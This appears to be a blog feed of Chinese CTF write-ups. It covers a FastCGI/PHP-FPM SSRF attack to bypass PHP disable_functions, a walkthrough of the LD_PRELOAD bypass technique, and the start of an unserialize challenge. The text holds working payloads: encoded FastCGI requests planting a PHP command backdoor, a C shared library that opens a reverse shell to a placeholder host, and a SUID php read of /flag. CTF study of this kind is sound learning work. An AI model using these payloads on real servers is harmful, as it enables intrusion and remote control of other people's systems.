class="o">=</span>%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%021%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%A5PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
</code></pre></div><p>打过去，看vps上的ftp断开，说明对话成功，回头看一眼<strong>phpinfo()</strong>:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505185334445.png" alt="image-20210505185334445"></p>
<p>后面就好说了，然鹅当我打开蚁剑，发现还是什么也动不了，命令执行还是和之前一模一样&hellip;我傻了</p>
<p>翻阅资料才发现伪造FastCGI请求PHP-CGI本身就是一次性的，相当于执行一次命令(之前gopher打ssrf那个脚本也是同理)，那最好的办法当然还是加载.so去打ssrf了&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">hack</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/8000 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc theoyu.c -shared -o theoyu.so 
</code></pre></div><p>把theoyu.so传到/var/www/html 目录后，再把之前脚本的php_value改为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$php_value</span> <span class="o">=</span> <span class="s2">&#34;unserialize_callback_func = system</span><span class="se">\n</span><span class="s2">extension_dir = /var/www/html</span><span class="se">\n</span><span class="s2">extension = theoyu.so</span><span class="se">\n</span><span class="s2">disable_classes = </span><span class="se">\n</span><span class="s2">disable_functions = </span><span class="se">\n</span><span class="s2">allow_url_include = On</span><span class="se">\n</span><span class="s2">open_basedir = /</span><span class="se">\n</span><span class="s2">auto_prepend_file = &#34;</span><span class="p">;</span> <span class="c1">// extension_dir即为.so文件所在目录
</span></code></pre></div><pre><code>/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&amp;file=ftp://ip:12345/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02G%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%BBPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+theoyu.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
</code></pre><p>同时vps打开监听，反弹成功后终于可以动了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505204851091.png" alt="image-20210505204851091"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@2be1b7732d18:/$ ls -al
total <span class="m">8</span>
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">78</span> May  <span class="m">5</span> 09:53 .
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">78</span> May  <span class="m">5</span> 09:53 ..
-rwxr-xr-x    <span class="m">1</span> root root    <span class="m">0</span> May  <span class="m">5</span> 09:53 .dockerenv
drwxr-xr-x    <span class="m">1</span> root root  <span class="m">179</span> Apr <span class="m">29</span> 14:53 bin
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Mar <span class="m">19</span> 23:44 boot
drwxr-xr-x    <span class="m">5</span> root root  <span class="m">340</span> May  <span class="m">5</span> 09:53 dev
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">66</span> May  <span class="m">5</span> 09:53 etc
-rwx------    <span class="m">1</span> root root   <span class="m">43</span> May  <span class="m">5</span> 09:53 flag
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Mar <span class="m">19</span> 23:44 home
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">45</span> Apr <span class="m">29</span> 14:53 lib
drwxr-xr-x    <span class="m">2</span> root root   <span class="m">34</span> Apr  <span class="m">8</span> 00:00 lib64
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Apr  <span class="m">8</span> 00:00 media
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Apr  <span class="m">8</span> 00:00 mnt
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Apr  <span class="m">8</span> 00:00 opt
dr-xr-xr-x <span class="m">2312</span> root root    <span class="m">0</span> May  <span class="m">5</span> 09:53 proc
drwx------    <span class="m">1</span> root root    <span class="m">6</span> Apr <span class="m">29</span> 15:13 root
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">23</span> May  <span class="m">5</span> 09:53 run
drwxr-xr-x    <span class="m">2</span> root root <span class="m">4096</span> Apr  <span class="m">8</span> 00:00 sbin
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Apr  <span class="m">8</span> 00:00 srv
dr-xr-xr-x   <span class="m">13</span> root root    <span class="m">0</span> May  <span class="m">5</span> 04:25 sys
drwxrwxrwt    <span class="m">1</span> root root    <span class="m">6</span> May  <span class="m">5</span> 12:40 tmp
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">19</span> Apr  <span class="m">8</span> 00:00 usr
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">39</span> Apr <span class="m">29</span> 14:53 var
</code></pre></div><p>但是发现 <strong>/flag</strong>还是不能读取，之后就是一个简单的suid提权。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@2be1b7732d18:/$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null

/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/local/bin/php
</code></pre></div><p>发现php就有s权限，直接写一个php执行读取即可。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
<span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
<span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505211624222.png" alt="image-20210505211624222"></p>
<h2 id="工具流谬杀">工具流谬杀</h2>
<p>本来以为这就结束了，看大佬博客的时候居然看到一位师傅改蚁剑脚本就能解题，我?????，复现一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505213712742.png" alt="image-20210505213712742"></p>
<p>蚁剑的自带工具就有关于FCGI的disable_function绕过，但要求<strong>fsockopen</strong>函数没有被过滤，并且默认端口为9000，所以当然直接用是绕过不了的。</p>
<p>但是php中还有一个<strong>pfsockopen</strong>函数，两者的区别仅仅只是发包<strong>Keep-Alive</strong>上的区别，对问题毫无影响！那我们直接深入到payload源码中去。</p>
<ul>
<li>\antData\plugins\as_bypass_php_disable_functions-master\payload.js</li>
<li>\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js</li>
</ul>
<p>把9000端口改为9001,<strong>fsockopen</strong>改为<strong>pfsockopen</strong>,然后传一个普通的一句话在html/下，用这个php去连接。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505214756517.png" alt="image-20210505214756517"></p>
<p>会在<strong>html/<strong>生成一个</strong>.antproxy.php</strong>文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220251625.png" alt="image-20210505220251625"></p>
<p>再用这个文件做马连接蚁剑，发现已经成为root用户..用php权限可直接查看flag。。。太骚了，妥妥的非预期。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220421304.png" alt="image-20210505220421304"></p>
<h2 id="后话">后话</h2>
<p>这一题还是挺牛逼的，结合的知识点相当多，无论是恶意加载链接库，fastcgi未授权访问，还是ftp打ssrf都可以写一篇文章，慢慢学吧~</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://github.com/wofeiwo/webcgi-exploits">webcgi-exploits</a></li>
<li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></li>
<li><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">phith0n-fpm.py</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>利用LD_PRELOAD绕过disable_function</title>
			<link>https://theoyu.top/posts/disabled_function/</link>
			<pubDate>Mon, 03 May 2021 10:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/disabled_function/</guid>
			<description>什么是LD_PRELOAD 在Linux的动态链接库的世界中，LD_PRELOAD是一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。
这里我们举行一个密码验证的例子，来初步探究LD_PRELOAD与动态链接的关系。
/* login.c */ #include &amp;lt;stdio.h&amp;gt;#include&amp;lt;string.h&amp;gt;int main(int argc,char **argv){ char passwd[]=&amp;#34;password&amp;#34;; if(!strcmp(passwd,argv[1])){ printf(&amp;#34;Correct Password!/n&amp;#34;); return 1; } printf(&amp;#34;Invalid Password!/n&amp;#34;); return 0; } 在上面这段程序中，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：
/* hack.c */ #include &amp;#34;stdio.h&amp;#34;#include &amp;lt;string.h&amp;gt;int strcmp(const char *s1,const char *s2){ printf(&amp;#34;hacking! s1=%s,s2=%s\n&amp;#34;,s1,s2); // return 0 indicates that 2 strings are equial  return 0 ; } 编译程序：
☁ c gcc login.c -o login ☁ c gcc -shared hack.c -o hack.so 运行一下:
☁ c .</description>
			<content type="html"><![CDATA[<h2 id="什么是ld_preload">什么是LD_PRELOAD</h2>
<p>在<strong>Linux</strong>的动态链接库的世界中，<strong>LD_PRELOAD</strong>是一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
<p>这里我们举行一个密码验证的例子，来初步探究<strong>LD_PRELOAD</strong>与动态链接的关系。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* login.c */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">passwd</span><span class="p">[]</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Correct Password!/n&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Invalid Password!/n&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>在上面这段程序中，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* hack.c */</span>
<span class="cp">#include</span> <span class="cpf">&#34;stdio.h&#34;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">int</span> <span class="nf">strcmp</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s1</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s2</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;hacking! s1=%s,s2=%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">);</span>
    <span class="c1">// return 0 indicates that 2 strings are equial 
</span><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span> <span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>编译程序：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">☁  c  gcc login.c -o login
☁  c  gcc -shared hack.c -o hack.so
</code></pre></div><p>运行一下:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">☁  c  ./login <span class="m">123456</span>
Invalid Password!/n% 
</code></pre></div><p>设置<strong>LD_PRELOAD</strong>变量:(使我们重写过的strcmp函数的hack.so成为优先载入链接库)，再重新运行</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">☁  c  <span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&#34;./hack.so&#34;</span>
☁  c  ./login <span class="m">123456</span>
hacking! <span class="nv">s1</span><span class="o">=</span>password,s2<span class="o">=</span><span class="m">123456</span>
Correct Password!/n%
</code></pre></div><p>可以看到：</p>
<ol>
<li>我们的hack.so中的ctramp被调用了。</li>
<li>主程序中的运行结果被影响了。</li>
</ol>
<h2 id="绕过disable_function">绕过disable_function</h2>
<p>设想这样一种思路:</p>
<pre><code>利用web漏洞启动一个新进程a.bin
a.bin内部调用系统函数b(),b()位于系统共享对象c.so中
我们创建c_evil.so，c_evil.so含有与b()中同名的恶意函数，同时把利用web漏洞将c_evil.so加载到环境变量中
由于c_evil.so优先级最高，所以a.bin将调用c_evil.so中的b()，达到命令执行。
</code></pre>
<p>根据上面的思路，我们需要web漏洞环境满足以下几种条件：</p>
<ol>
<li>具有可写入目录,用于上传.so文件</li>
<li>能够控制<strong>LD_PRELOAD</strong>环境变量的值，例如<strong>putenv()</strong> 函数。</li>
<li>函数调用的新进程需要加载.so文件。</li>
</ol>
<p>在第三点中，经过测试<code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code>、<code>error_log()</code>均可以调用外部新进程，这里我们拿<code>mail()</code>作为研究对象。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><strong>strace</strong>命令可以用于跟踪api调用情况</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">☁  ~  strace -f php mail.php 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -A2 -B2 execve
sh: 1: /usr/sbin/sendmail: not found
</code></pre></div><p>发现确实调用了外部进程..但我没有下载&hellip;下载后:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-03-image-20210503141852067.png" alt="image-20210503141852067"></p>
<p>我们再跟进看一看<strong>sendmail</strong>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">☁  ~  readelf -Ws /usr/sbin/sendmail
Symbol table <span class="s1">&#39;.dynsym&#39;</span> contains <span class="m">347</span> entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: <span class="m">0000000000000000</span>     <span class="m">0</span> NOTYPE  LOCAL  DEFAULT  UND 
     1: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND sasl_server_init@SASL2 <span class="o">(</span>2<span class="o">)</span>
     2: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND DH_size@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
     3: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND X509_STORE_set_flags@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
     4: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND wait@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
     5: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND X509_STORE_add_crl@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
     6: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND SSL_CTX_load_verify_locations@OPENSSL_1_1_0 <span class="o">(</span>5<span class="o">)</span>
     7: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND SSL_CTX_set_client_CA_list@OPENSSL_1_1_0 <span class="o">(</span>5<span class="o">)</span>
     8: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND ERR_reason_error_string@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
     9: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND DSA_generate_parameters_ex@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
    10: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND getuid@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    11: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND getsockname@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    12: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND __res_state@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    13: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND uname@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    14: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND BN_new@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
    15: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND <span class="k">select</span>@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    16: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND RSA_new@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
    17: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.14 <span class="o">(</span>6<span class="o">)</span>
    ...
	...
</code></pre></div><p>在若干库函数中，我们选择<strong>getuid</strong>作为研究对象。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* hack.c*/</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">hack</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo theoyu &gt; result&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">getuid</span><span class="p">(){</span>
    <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
    <span class="n">hack</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div><p>编译:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">☁  demo  gcc -shared hack.c -o hack.so
</code></pre></div><p>php：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=/home/theoyu/demo/hack.so&#34;</span><span class="p">);</span>
<span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>执行:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">☁  demo  php mail.php
☁  demo  cat result 
theoyu
</code></pre></div><p>可以看到我们没有利用任何PHP 的 命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
<p>但很明显可以看到一点，在真实情况下，肉鸡不一定安装了<strong>sendmail</strong>，我们也不可能通过www-data用户去让其安装，基于这点，<a href="https://www.freebuf.com/web/192052.html">yangyangwithgnu</a>师傅发现了一个可以<strong>加载时就执行代码</strong>的方法，进而达到命令执行的效果。</p>
<h2 id="一个误区">一个误区</h2>
<p>在<a href="https://github.com/yangyangwithgnu">yangyangwithgnu</a>的文章中，是这样写到的：</p>
<pre><code>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，
而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数
简直神似！几经搜索后了解，GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，
可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加
载，立即将执行 __attribute__((constructor)) 修饰的函数。强调下，这一细节非常重要，很多
朋友用LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，我们不
要局限于仅劫持某一函数，而应考虑劫持共享对象。
</code></pre>
<p>按照这篇文章的说法，我们只需利用<code>putenv</code>设置<code>LD_PRELOAD</code> ，使得使用了<code>__attribute__((constructor))</code>修饰函数的恶意动态链接库被系统加载便能实现命令执行，而不再需要再去劫持程序调用的库函数，<code>sendmail</code> 存不存在也就无所谓了。</p>
<p>然而我们的这个恶意动态链接库（共享对象）究竟是怎么被 “系统” 加载的呢？文章中没有说的很清楚，也可能是我对于程序的链接、装载这一块确实不了解，所以我打算动手实践一下。</p>
<p>但是一个不可思议的结果发生了&hellip; 我手动把<strong>sendmail</strong> 删除后，不小心又重新运行了一次<code>php mail.php</code>,<strong>result</strong> 命令执行居然还是成功了。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">☁  demo  php mail.php 
sh: 1: /usr/sbin/sendmail: not found
☁  demo  cat result 
theoyu
</code></pre></div><p>这我不太能接受，如果sendmail根本不需要的话，那文章的后大篇幅关于**__attribute__((constructor))**的讲解也是没有太大意义的，我们回头看看<code>strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-03-image-20210503160144193.png" alt="image-20210503160144193"></p>
<p>事实上，顺着作者的思路，我们居然把**/bin/sh**这个调用进程所忽略了，也就是说在这一步，真正加载了动态链接库的其实是<code>/bin/sh</code> 的进程，其实我们大可不必使用<code>__attribute__((constructor))</code> ，直接劫持<code>/bin/sh</code> 的库函数即可,方法与**sendmail** 一致。可以说用<code>__attribute__((constructor))</code> ，只是为我们免去了挑选库函数的一步而已。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.anquanke.com/post/id/175403#h2-1">深入浅出LD_PRELOAD &amp; putenv()</a></li>
<li><a href="https://www.freebuf.com/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>某群一道反序列化题</title>
			<link>https://theoyu.top/posts/unserialize1/</link>
			<pubDate>Sun, 02 May 2021 16:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/unserialize1/</guid>
			<description>五一忽然就要过了..感觉要学的好没学，考试也没复习，早上12点在某ctf群看到在讨论这道题，就起床做做了&amp;hellip;
 题目给出源码：
&amp;lt;?php highlight_file(__FILE__); class main{ public $settings; public $params; public function __construct(){ $this-&amp;gt;settings=array( &amp;#39;display_errors&amp;#39;=&amp;gt;&amp;#39;On&amp;#39;, &amp;#39;allow_url_fopen&amp;#39;=&amp;gt;&amp;#39;On&amp;#39; ); $this-&amp;gt;params=array(); } public function __wakeup(){ foreach ($this-&amp;gt;settings as $key =&amp;gt; $value) { ini_set($key, $value); } } public function __destruct(){ file_put_contents(&amp;#39;settings.inc&amp;#39;, unserialize($this-&amp;gt;params)); } } unserialize($_GET[&amp;#39;data&amp;#39;]); 法一 反序列化回调函数+后缀文件包含 给了源码就好说，在本地测试一下。我们可以对settings.inc文件进行写入，那自然想到的就是写入一句话然后进行文件包含，找一下有没有原生调用函数的方法。
就在官网手册的unserialize() 处发现了这个函数，官方给出的实例是这样的
